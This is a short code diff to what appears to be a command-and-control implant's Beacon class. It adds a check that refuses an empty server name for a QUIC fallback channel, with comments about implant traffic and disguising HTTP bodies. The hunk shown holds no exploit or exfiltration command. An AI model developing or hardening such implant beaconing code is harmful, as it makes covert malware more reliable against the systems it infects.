@@ -7691,6 +7691,18 @@ class Beacon:
             if ":" in host:
                 host, port = host.rsplit(":", 1)
                 port = int(port)
+            if not host:
+                # An enabled leg with no `c2.fallback.quic.server`. Refused
+                # by name rather than resolved, because the platforms
+                # disagree about what an empty name means:
+                # `getaddrinfo("", 4433, AF_INET, SOCK_DGRAM)` answers
+                # ('127.0.0.1', 4433) on macOS and raises gaierror on
+                # glibc. Measured both ways. Aiming an implant's traffic at
+                # loopback because a key was left blank is not a default
+                # worth having on either.
+                logger.debug("QUIC leg has no server configured")
+                self._record_leg("quic", _RESCUE_CLASSES["resolve_failed"])
+                return None
 
             # No envelope on a datagram either: there is no HTTP body to
             # disguise, and the frame header below already describes the
